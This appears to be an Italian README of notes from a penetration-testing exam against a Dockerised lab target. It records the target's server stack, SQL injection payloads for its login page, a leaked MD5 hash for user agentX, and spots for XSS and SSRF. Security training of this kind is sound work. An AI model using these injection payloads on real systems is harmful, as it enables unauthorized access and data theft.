# ProgettoPT
Progetto Penetration Testing

*docker pull gabrielec/ptexam*

*docker run gabrielec/ptexam*

Payloads [(https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#tools)]

Information Gathering


- Debian (url random da pagina di errore Apache)

- Apache server 2.4.38 (url random da pagina di errore Apache)

- PHP 7.2.34 (Response Header)

- MariaDB (carattere ' in username nella pagina login)

- Tabella con gli Utenti (Case insensitive):

  - Colonna Username (Campo Username nel Login: ' OR Username #)

  - Colonna Password (Campo Username nel Login: ' OR Password #)

  - Colonna Id (Campo Username nel Login: ' OR Id #)

- Query per Login:
  
  - seleziona due parametri (' OR 1 LIKE 1 UNION SELECT 1, 1 #)

  - Carattere = non permesso

  - sostituisce gli spazi con dei +

  - hash MD5 di password (plain) (Username: frog'; password: frog)

- Pagina logout.php

- Utente: agentX

Vulnerabilities

- SQL Injection (/login.php)

  - ' OR Username LIKE (SELECT Username) LIMIT 1; #

  - ' OR Username LIKE 'agentX' LIMIT 1; #

- Password (hashed MD5) per agentX: b20e0aaa66fdd9a7a5b2ebf49d32b91b (get_password())

- Reflected XSS (/welcome.php)

- Maybe SSRF (SSRFmap [https://github.com/swisskyrepo/SSRFmap/tree/master])

- Reflected XSS (/recovery.php)

- Stored XSS (/report.php)